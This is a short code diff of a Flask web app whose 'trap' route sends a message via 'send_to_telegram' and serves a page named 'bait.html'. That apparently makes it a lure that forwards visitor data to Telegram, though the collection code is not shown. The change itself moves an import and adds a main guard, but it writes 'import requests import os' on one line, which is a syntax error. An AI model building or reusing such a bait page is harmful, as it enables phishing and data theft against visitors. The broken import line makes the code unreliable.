@@ -1,5 +1,5 @@
 from flask import Flask, request, render_template
-import requests
+import requests import os
 
 app = Flask(__name__)
 
@@ -39,7 +39,6 @@ def trap():
     send_to_telegram(msg)
     return render_template("bait.html")
 
-import os
-
-port = int(os.environ.get("PORT", 5000))
-app.run(host="0.0.0.0", port=port)
+if __name__ == '__main__':
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host='0.0.0.0', port=port)
